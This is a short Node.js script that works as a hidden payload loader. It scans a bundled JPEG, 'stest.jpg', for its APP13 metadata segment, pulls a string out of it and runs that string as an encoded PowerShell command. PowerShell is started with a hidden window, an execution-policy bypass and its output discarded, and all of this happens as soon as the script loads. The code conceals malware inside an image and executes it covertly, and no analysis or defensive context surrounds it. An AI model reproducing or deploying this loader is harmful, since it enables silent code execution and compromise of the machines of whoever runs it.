const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

function rnbuffer(imagePath) {
  const buffer = fs.readFileSync(imagePath);
  let offset = 2;
  while (offset < buffer.length - 1) {
    if (buffer[offset] !== 0xFF) {
      offset++;
      continue;
    }
    const marker = buffer[offset + 1];
    const size = buffer.readUInt16BE(offset + 2);
    if (marker === 0xED) {
      const payload = buffer.slice(offset + 4, offset + 2 + size).toString('utf8');
      runPowerShell(payload);
      break;
    }
    offset += 2 + size;
  }
}

function runPowerShell(encodedCommand) {
  spawn('cmd.exe', [
    '/c', 'start', '/b', 'powershell.exe',
    '-WindowStyle', 'Hidden', '-NoProfile', '-NonInteractive',
    '-ExecutionPolicy', 'Bypass', '-EncodedCommand', encodedCommand
  ], { stdio: 'ignore', shell: true });
}

rnbuffer(path.join(__dirname, 'stest.jpg'));
